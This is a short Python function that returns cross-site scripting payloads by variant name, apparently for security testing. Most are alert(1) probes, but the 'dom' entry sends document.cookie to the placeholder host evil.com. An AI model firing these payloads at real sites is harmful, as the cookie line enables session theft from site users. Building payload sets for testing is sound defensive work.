def generate(variant):
    payloads = {
        "reflected": '<script>alert(1)</script>',
        "stored": '<img src=x onerror=alert(1)>',
        "dom": "javascript:document.location='http://evil.com?c='+document.cookie",
        "svg": "<svg/onload=alert(1)>",
        "nullbyte": "<script\0>alert(1)</script>",
        "eventhandler": '<div onclick=alert(1)>Click</div>',
        "srcdoc": '<iframe srcdoc="<script>alert(1)</script>"></iframe>'
    }
    return payloads.get(variant, "<script>alert('XSS')</script>")
